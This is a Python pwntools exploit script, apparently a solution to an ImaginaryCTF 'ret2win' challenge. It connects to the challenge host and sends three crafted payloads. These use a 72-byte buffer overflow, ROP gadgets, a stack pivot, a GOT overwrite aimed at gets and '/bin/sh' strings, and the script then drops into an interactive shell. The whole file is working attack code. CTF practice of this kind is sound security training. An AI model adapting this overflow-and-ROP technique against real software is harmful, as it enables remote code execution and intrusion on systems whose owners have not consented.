#!/usr/bin/env python3


from pwn import *

e = ELF("./vuln")
r = remote("ret2win.chal.imaginaryctf.org",1337)
#r = process("./vuln")
rop = ROP(e)
ret = rop.find_gadget(['ret'])[0]
pop_rbp = rop.find_gadget(['pop rbp','ret'])[0]
exploit = b"A" * 72 + p64(pop_rbp)+ p64(0x404d40) + p64(0x401162) 
r.sendline(exploit)
exploit = p64(0) + b"A" * 0x38 + b"B" * 8 + p64(pop_rbp) + p64(e.got.gets + 0x40) + p64(0x401162) + b"/bin/sh\x00" * 53 + p64(0x404df0) + p64(0x401162) 
r.sendline(exploit)
exploit = p64(0x401191) + b"A" * 0x38 + b"B" * 8 + p64(pop_rbp) + p64(0x404f08) + p64(0x401178) + p64(0x401162) 
r.sendline(exploit)
r.interactive()
